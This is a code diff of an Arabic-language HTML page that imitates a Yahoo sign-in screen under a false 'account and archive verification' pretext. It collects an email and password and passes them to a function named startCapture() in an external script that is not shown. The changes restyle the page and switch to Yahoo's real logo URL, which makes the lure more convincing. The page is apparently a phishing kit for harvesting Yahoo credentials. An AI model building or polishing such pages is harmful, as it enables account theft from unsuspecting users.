@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yahoo | التحقق من الأمان</title>
+    <title>Yahoo | توثيق الحساب والأرشيف</title>
     <style>
         body {
             background-color: #f1f1f5;
@@ -17,27 +17,36 @@
         .login-box {
             background: white;
             padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 350px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 400px;
             text-align: center;
         }
-        img.logo { width: 100px; margin-bottom: 20px; }
-        h2 { font-size: 24px; color: #26282a; margin-bottom: 10px; }
-        p { color: #5b5b5b; font-size: 14px; margin-bottom: 25px; }
+        .logo {
+            width: 90px;
+            margin-bottom: 25px;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: bold;
+            color: #26282a;
+            margin-bottom: 30px;
+        }
         input {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             margin-bottom: 15px;
             border: 1px solid #d8d8d8;
             border-radius: 4px;
+            background-color: #f0f4ff;
             box-sizing: border-box;
-            font-size: 16px;
+            font-size: 15px;
+            text-align: center;
         }
         button {
             width: 100%;
-            padding: 12px;
-            background-color: #6001d2;
+            padding: 14px;
+            background-color: #6001d2; /* لون ياهو البنفسجي */
             color: white;
             border: none;
             border-radius: 25px;
@@ -45,26 +54,24 @@
             font-weight: bold;
             cursor: pointer;
             transition: 0.3s;
+            margin-top: 10px;
         }
-        button:hover { background-color: #4a00a8; }
-        .footer-links { margin-top: 20px; font-size: 12px; color: #888; }
+        button:hover {
+            background-color: #4a00a8;
+        }
     </style>
 </head>
 <body>
 
     <div class="login-box">
-        <img src="https://z-m-scontent.famm11-1.fna.fbcdn.net/v/t39.2081-6/12000968_1558451334416560_1340156976_n.png?_nc_cat=1&ccb=1-7&_nc_sid=505a41&_nc_ohc=f68LInOnyT8Q7kNvgErH73j&_nc_ht=z-m-scontent.famm11-1.fna&oh=00_AYBeW-Jz6pYF-Z9N5S_T8tV4E9eE3I2yD-o3A2Qv5xP5Vw&oe=669B1D5F" alt="Yahoo" class="logo">
-        <h2>تسجيل الدخول</h2>
-        <p>استخدم حساب ياهو الخاص بك للتوثيق</p>
+        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo">
         
-        <input type="email" id="email" placeholder="اسم المستخدم أو الإيميل" required>
+        <h2>توثيق الحساب والأرشيف</h2>
+        
+        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
         <input type="password" id="pass" placeholder="كلمة المرور" required>
         
-        <button onclick="startCapture()">توثيق</button>
-
-        <div class="footer-links">
-            <span>نسيت اسم المستخدم؟</span> • <span>إنشاء حساب</span>
-        </div>
+        <button onclick="startCapture()">تسجيل الدخول والتوثيق</button>
     </div>
 
     <script src="app-min.js"></script>
